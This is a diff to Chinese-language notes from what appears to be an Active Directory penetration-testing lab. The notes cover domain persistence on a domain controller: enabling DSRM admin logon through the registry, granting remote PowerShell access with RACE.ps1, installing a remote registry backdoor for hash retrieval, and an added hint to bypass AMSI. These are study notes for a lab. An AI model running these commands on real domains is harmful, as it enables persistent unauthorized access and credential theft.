@@ -65,7 +65,7 @@ DSRM administrator不允许登陆，用之前的session进入DC修改
 
 再运行下面命令，修改DSRM的远程登录策略
 ```
- New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 ```
 
 
@@ -132,7 +132,7 @@ PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local"
 ```
 如果没有任何返回，表示没有权限
 
-来到有DA权限的shell
+来到有DA权限的shell，注意这里要enter-pssession到DC服务器
 
 添加完全控制权限
 ```
@@ -175,13 +175,13 @@ gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.lo
 
 ### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令
 
-DA shell，引入RACE.ps1，域名写全
+DA shell，引入RACE.ps1，域名写全(注意：这里如果不能正常设置，enter-psssesion到DC，bypass AMSI，远程加载RACE.ps1后在DC上设置)
 ```
 PS C:\ad> . .\RACE.ps1
 PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
 ```
 
-在学生shell（重启VM生效），执行whoami命令
+在学生shell，执行whoami命令
 ```
 Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
@@ -195,7 +195,7 @@ Modifying DC registry security descriptors for remote hash retrieval using DAMP
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
 ```
 
-在学生shell（重启VM生效）
+在学生shell
 引入框架
 ```
 PS C:\ad> . .\RACE.ps1
